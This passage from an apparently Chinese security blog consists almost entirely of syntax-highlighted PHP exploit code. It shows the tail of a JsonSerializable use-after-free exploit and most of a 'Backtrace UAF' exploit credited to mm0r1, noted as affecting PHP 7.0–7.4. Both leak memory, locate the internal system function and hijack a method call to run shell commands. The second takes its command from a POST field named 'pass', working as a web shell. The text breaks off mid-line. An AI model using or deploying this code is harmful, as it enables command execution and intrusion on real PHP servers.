class="line"></span><br><span class="line">        $e_phoff = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = <span class="keyword">$this</span>-&gt;leak2($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = <span class="keyword">$this</span>-&gt;leak2($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = <span class="keyword">$this</span>-&gt;leak2($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = <span class="keyword">$this</span>-&gt;leak2($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = <span class="keyword">$this</span>-&gt;leak2($addr);</span><br><span class="line">            $f_name = <span class="keyword">$this</span>-&gt;leak2($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;leak2($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;</span><br><span class="line"></span><br><span class="line">        $contiguous = [];</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $contiguous[] = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line"></span><br><span class="line">        $room = [];</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">            $room[] = <span class="keyword">new</span> Z();</span><br><span class="line"></span><br><span class="line">        $_protector = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        $p = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>($y[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>($p);</span><br><span class="line"></span><br><span class="line">        $protector = <span class="string">".$_protector"</span>;</span><br><span class="line"></span><br><span class="line">        $x = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line">        $x-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        $x-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'UAF failed.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $spl1 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line">        $spl2 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        $class_entry = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        $handlers = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        $php_heap = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        $abc_addr = $php_heap - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        $fake_obj = $abc_addr;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>, $abc_addr); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x10</span> + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak1($class_entry + <span class="number">0x10</span> + $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        $fake_tbl_off = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x30</span>, $abc_addr + $fake_tbl_off);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x38</span>, $abc_addr + $fake_tbl_off);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        $binary_leak = <span class="keyword">$this</span>-&gt;leak2($handlers + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!($base = <span class="keyword">$this</span>-&gt;get_binary_base($binary_leak))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!($elf = <span class="keyword">$this</span>-&gt;parse_elf($base))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!($basic_funcs = <span class="keyword">$this</span>-&gt;get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!($zif_system = <span class="keyword">$this</span>-&gt;get_system($basic_funcs))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        $fake_bkt_off = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        $function_data = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">4</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2($function_data + <span class="number">0x40</span> * <span class="number">4</span>, $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        $fake_bkt_addr = $abc_addr + $fake_bkt_off;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>, $fake_bkt_addr);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">3</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x58</span> + $i * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        $function_zval = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">12</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc,  $fake_bkt_off + <span class="number">0x70</span> + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2($function_zval, $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off + <span class="number">0x70</span> + <span class="number">0x30</span>, $zif_system);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off, $fake_bkt_addr + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        $spl1-&gt;offsetGet($cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y = [<span class="keyword">new</span> Z()];</span><br><span class="line">json_encode([&amp;$y]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h1><p>影响版本是7.0-7.4  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn($_POST[<span class="string">"pass"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span 